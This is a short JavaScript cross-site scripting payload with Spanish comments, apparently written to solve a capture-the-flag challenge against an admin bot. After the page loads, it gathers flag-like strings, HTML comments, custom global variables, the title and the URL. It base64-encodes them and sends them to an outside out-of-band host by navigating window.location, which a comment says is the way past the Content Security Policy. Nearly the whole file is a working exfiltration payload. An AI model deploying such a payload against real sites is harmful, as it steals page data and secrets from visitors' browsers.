// Esperamos a que la página esté totalmente cargada (incluyendo scripts dinámicos)
window.addEventListener('load', function() {
    setTimeout(function() { // Damos 2 segundos extra por si hay carga lenta
        
        let report = {};

        // 1. Buscar en el texto visible (con Regex para encontrar la flag)
        const bodyText = document.body.innerText;
        const flagRegex = /flag\{.*?\}|CTF\{.*?\}/i;
        const match = bodyText.match(flagRegex);
        report.foundFlag = match ? match[0] : "No encontrada en texto";

        // 2. Buscar en COMENTARIOS (Truco clásico de CTF: el flag está escondido en )
        let comments = [];
        let walker = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT, null, false);
        let node;
        while(node = walker.nextNode()) {
            comments.push(node.nodeValue);
        }
        report.comments = comments;

        // 3. Buscar variables globales "sospechosas"
        // Filtramos las estándar para ver qué creó el desarrollador del reto
        report.customVars = Object.keys(window).filter(key => {
            return !["window", "document", "location", "top", "chrome", "navigator"].includes(key) && isNaN(key);
        });

        // 4. Capturar el título y la URL actual (por si el bot navegó a otra parte)
        report.title = document.title;
        report.currentUrl = window.location.href;

        // Enviamos todo a través de window.location (el único que salta tu CSP)
        const finalData = btoa(JSON.stringify(report));
        window.location = "https://wedwqcbkveknzrplplbbf2thxekxhd8hu.oast.fun/recon?d=" + finalData;

    }, 2000); 
});